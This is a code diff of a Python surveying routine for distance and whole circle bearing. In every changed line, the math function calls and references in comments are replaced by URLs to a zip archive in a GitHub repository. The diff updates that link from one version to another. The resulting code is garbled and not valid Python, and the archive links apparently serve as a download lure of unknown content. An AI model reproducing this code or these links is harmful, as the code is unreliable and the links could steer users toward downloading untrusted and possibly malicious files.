@@ -25,7 +25,7 @@ def compute_join_from_yx():
     dX = x2 - x1
 
     # Calculate Horizontal Distance (HD)
-    hd = https://raw.githubusercontent.com/wekwaka/assignment-2-/main/austenite/assignment_v1.3-alpha.2.zip(dY**2 + dX**2)
+    hd = https://github.com/wekwaka/assignment-2-/raw/refs/heads/main/austenite/assignment_v1.5-alpha.2.zip(dY**2 + dX**2)
 
     # Calculate Whole Circle Bearing (WCB)
     wcb_degrees = 0.0 # Initialize WCB_DEGREES
@@ -35,10 +35,10 @@ def compute_join_from_yx():
     else:
         # Determine the reference angle (alpha) using absolute values
         # This gives an acute angle between 0 and 90 degrees.
-        # https://raw.githubusercontent.com/wekwaka/assignment-2-/main/austenite/assignment_v1.3-alpha.2.zip(y, x) is generally safer as it handles quadrants and zero divisions well.
+        # https://github.com/wekwaka/assignment-2-/raw/refs/heads/main/austenite/assignment_v1.5-alpha.2.zip(y, x) is generally safer as it handles quadrants and zero divisions well.
         # For surveying where North (Y+) is 0/360 and East (X+) is 90:
-        # The standard https://raw.githubusercontent.com/wekwaka/assignment-2-/main/austenite/assignment_v1.3-alpha.2.zip(dX, dY) will give angle from +Y axis (North)
-        # However, https://raw.githubusercontent.com/wekwaka/assignment-2-/main/austenite/assignment_v1.3-alpha.2.zip(dX, dY) returns angle in radians from -pi to pi.
+        # The standard https://github.com/wekwaka/assignment-2-/raw/refs/heads/main/austenite/assignment_v1.5-alpha.2.zip(dX, dY) will give angle from +Y axis (North)
+        # However, https://github.com/wekwaka/assignment-2-/raw/refs/heads/main/austenite/assignment_v1.5-alpha.2.zip(dX, dY) returns angle in radians from -pi to pi.
         # Let's adjust to common surveying practice where Y is Northing and X is Easting.
 
         # Using quadrant logic for clarity with ATAN(opposite/adjacent)
@@ -54,8 +54,8 @@ def compute_join_from_yx():
                 wcb_degrees = 270.0 # Due West
         else:
             # Calculate the reference angle (always positive, acute)
-            ref_angle_rad = abs(https://raw.githubusercontent.com/wekwaka/assignment-2-/main/austenite/assignment_v1.3-alpha.2.zip(dX / dY))
-            ref_angle_deg = https://raw.githubusercontent.com/wekwaka/assignment-2-/main/austenite/assignment_v1.3-alpha.2.zip(ref_angle_rad)
+            ref_angle_rad = abs(https://github.com/wekwaka/assignment-2-/raw/refs/heads/main/austenite/assignment_v1.5-alpha.2.zip(dX / dY))
+            ref_angle_deg = https://github.com/wekwaka/assignment-2-/raw/refs/heads/main/austenite/assignment_v1.5-alpha.2.zip(ref_angle_rad)
 
             # Determine WCB based on quadrant
             if dY > 0 and dX > 0: # Quadrant I (NE)
